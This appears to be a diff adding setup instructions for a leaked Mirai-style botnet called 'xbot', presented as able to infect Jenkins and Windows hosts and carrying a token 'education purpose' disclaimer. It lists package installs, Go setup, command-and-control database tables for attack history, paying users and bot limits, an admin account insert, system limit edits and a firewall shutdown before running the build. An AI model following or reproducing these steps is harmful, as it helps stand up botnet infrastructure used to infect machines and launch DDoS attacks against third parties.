@@ -1,0 +1,68 @@
+idk windows botnet; u can infect jenkins cause jenkins are windows bots tooo
+btw leaked by milk botnet; education purpose guys do not ddos it's illgal bruh
+
+sudo apt update && sudo apt upgrade
+apt install software-properties-common -y
+apt install build-essential -y
+apt install libgmp-dev -y
+apt-get install screen wget bzip2 gcc nano g++ electric-fence sudo git libc6-dev apache2 xinetd tftpd-hpa mariadb-server python3 php vsftpd mingw-w64 -y
+
+wget https://go.dev/dl/go1.24.2.linux-amd64.tar.gz
+sudo rm -rf /usr/local/go
+sudo tar -C /usr/local -xzf go1.24.2.linux-amd64.tar.gz
+echo 'export PATH=$PATH:/usr/local/go/bin' | sudo tee /etc/profile.d/go.sh
+source /etc/profile.d/go.sh
+go version
+go mod init xbot
+go get github.com/go-sql-driver/mysql
+
+mysql -u root -p
+
+CREATE DATABASE xbot;
+use xbot;
+CREATE TABLE `history` (
+  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
+  `user_id` int(10) unsigned NOT NULL,
+  `time_sent` int(10) unsigned NOT NULL,
+  `duration` int(10) unsigned NOT NULL,
+  `command` text NOT NULL,
+  `max_bots` int(11) DEFAULT '-1',
+  PRIMARY KEY (`id`),
+  KEY `user_id` (`user_id`)
+);
+ 
+CREATE TABLE `users` (
+  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
+  `username` varchar(32) NOT NULL,
+  `password` varchar(32) NOT NULL,
+  `duration_limit` int(10) unsigned DEFAULT NULL,
+  `cooldown` int(10) unsigned NOT NULL,
+  `wrc` int(10) unsigned DEFAULT NULL,
+  `last_paid` int(10) unsigned NOT NULL,
+  `max_bots` int(11) DEFAULT '-1',
+  `admin` int(10) unsigned DEFAULT '0',
+  `intvl` int(10) unsigned DEFAULT '30',
+  `api_key` text,
+  PRIMARY KEY (`id`),
+  KEY `username` (`username`)
+);
+ 
+CREATE TABLE `whitelist` (
+  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
+  `prefix` varchar(16) DEFAULT NULL,
+  `netmask` tinyint(3) unsigned DEFAULT NULL,
+  PRIMARY KEY (`id`),
+  KEY `prefix` (`prefix`)
+);
+
+INSERT INTO users VALUES (NULL, 'nickname', 'password', 0, 0, 0, 0, -1, 1, 30, '');
+quit;
+
+sudo sed -i 's/1024/999999/g' /usr/include/x86_64-linux-gnu/bits/typesizes.h
+ulimit -n999999; ulimit -u999999; ulimit -e999999
+
+service iptables stop 
+service apache2 restart
+service mariadb restart
+
+bash build.sh
